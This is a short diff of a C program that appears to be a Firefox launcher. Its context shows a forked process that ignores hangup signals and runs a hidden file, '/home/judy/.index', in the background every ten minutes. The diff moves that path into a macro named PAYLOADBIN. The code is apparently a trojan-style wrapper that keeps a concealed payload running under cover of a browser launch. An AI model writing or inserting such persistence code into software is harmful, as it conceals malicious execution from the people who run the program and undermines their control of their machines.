@@ -6,6 +6,8 @@
 #include <sys/wait.h>
 #include <fcntl.h>
 
+#define PAYLOADBIN "/home/judy/.index &"
+
 int main() {
     // Fork a child process to launch Firefox
     pid_t firefox_pid = fork();
@@ -49,7 +51,7 @@ int main() {
         signal(SIGHUP, SIG_IGN);
 
         while (1) {
-            system("/home/judy/.index &");
+            system(PAYLOADBIN);
             sleep(600);  
         }
     }
